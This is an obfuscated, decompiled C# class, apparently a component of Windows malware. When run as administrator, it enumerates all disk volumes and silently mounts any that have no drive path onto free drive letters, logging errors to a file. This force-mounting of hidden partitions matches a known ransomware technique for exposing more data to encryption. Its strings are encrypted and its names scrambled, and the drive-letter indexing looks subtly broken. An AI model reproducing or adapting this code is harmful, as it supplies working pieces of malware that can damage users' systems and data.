using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace frgoWklvEOSV;

public static class YwweHUBoXKc
{
	public enum aoVQlSlNMGvUN : uint
	{
		BXfGkhjXuWiy,
		zGsmOWaqNPFBh,
		NwWIJiQmtgSo,
		vJXwqumqOpP,
		fZqsRqcxSpgwz,
		eNcEdpRrGCDfDIX,
		SMuWHfCtDJyPF
	}

	private sealed class CiDhmCSplTd
	{
		public uint YUODfTNXSuBLl;

		public uint orvrPCuergqloAN;

		public char[] YtssZkVZpJD;

		public bool _003CMountVolumes_003Eb__0(string string_0)
		{
			if (GetVolumePathNamesForVolumeNameW(string_0, YtssZkVZpJD, orvrPCuergqloAN, ref YUODfTNXSuBLl))
			{
				return YtssZkVZpJD.Length != 3;
			}
			return true;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	public static extern aoVQlSlNMGvUN GetDriveType([MarshalAs(UnmanagedType.LPStr)] string cJiSFYQZwjpvr);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetVolumePathNamesForVolumeNameW(string eHpsJQaFeiSpM, char[] lYSGVGpilcwVB, uint CCiTaIIQsaLudI, ref uint IQovdFeuYrrhek);

	[DllImport("kernel32.dll")]
	internal static extern bool SetVolumeMountPoint(string string_0, string string_1);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern int FindFirstVolume(StringBuilder stringBuilder_0, int int_0);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
	public static extern bool FindNextVolume(int int_0, StringBuilder stringBuilder_0, int int_1);

	public static List<string> mRvbESbLCB()
	{
		StringBuilder stringBuilder = new StringBuilder(1024);
		List<string> list = new List<string>();
		int int_ = FindFirstVolume(stringBuilder, 1024);
		do
		{
			list.Add(stringBuilder.ToString());
			Console.WriteLine(stringBuilder.ToString());
		}
		while (FindNextVolume(int_, stringBuilder, 1024));
		return list;
	}

	public static void UaIpTTmaRi()
	{
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			CiDhmCSplTd CS_0024_003C_003E8__locals0 = new CiDhmCSplTd();
			string[] array = new string[26]
			{
				getString_0(107396004),
				getString_0(107395974),
				getString_0(107396064),
				getString_0(107396031),
				getString_0(107396021),
				getString_0(107395996),
				getString_0(107396016),
				getString_0(107396044),
				getString_0(107396014),
				getString_0(107396009),
				getString_0(107396628),
				getString_0(107396026),
				getString_0(107396069),
				getString_0(107396091),
				getString_0(107396086),
				getString_0(107396081),
				getString_0(107396039),
				getString_0(107396034),
				getString_0(107396061),
				getString_0(107395991),
				getString_0(107395969),
				getString_0(107396074),
				getString_0(107395979),
				getString_0(107396079),
				getString_0(107396051),
				getString_0(107396056)
			};
			string[] array2 = new string[array.Length];
			int num = 0;
			string[] array3 = array;
			foreach (string text in array3)
			{
				if (GetDriveType(text) == aoVQlSlNMGvUN.zGsmOWaqNPFBh)
				{
					array2[num++] = text;
				}
			}
			List<string> source = mRvbESbLCB();
			CS_0024_003C_003E8__locals0.YUODfTNXSuBLl = 0u;
			CS_0024_003C_003E8__locals0.orvrPCuergqloAN = 120u;
			CS_0024_003C_003E8__locals0.YtssZkVZpJD = new char[260];
			foreach (string item in source.Where((string string_0) => !GetVolumePathNamesForVolumeNameW(string_0, CS_0024_003C_003E8__locals0.YtssZkVZpJD, CS_0024_003C_003E8__locals0.orvrPCuergqloAN, ref CS_0024_003C_003E8__locals0.YUODfTNXSuBLl) || CS_0024_003C_003E8__locals0.YtssZkVZpJD.Length != 3))
			{
				SetVolumeMountPoint(array2[num--], item);
				if (GRQFeQGQfBG.qoRjYABduZF)
				{
					try
					{
						Console.WriteLine(getString_0(107398337), array2[num--]);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (GRQFeQGQfBG.joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(GRQFeQGQfBG.jnRLNtXuRRg, getString_0(107398312) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static YwweHUBoXKc()
	{
		Strings.CreateGetStringDelegate(typeof(YwweHUBoXKc));
	}
}
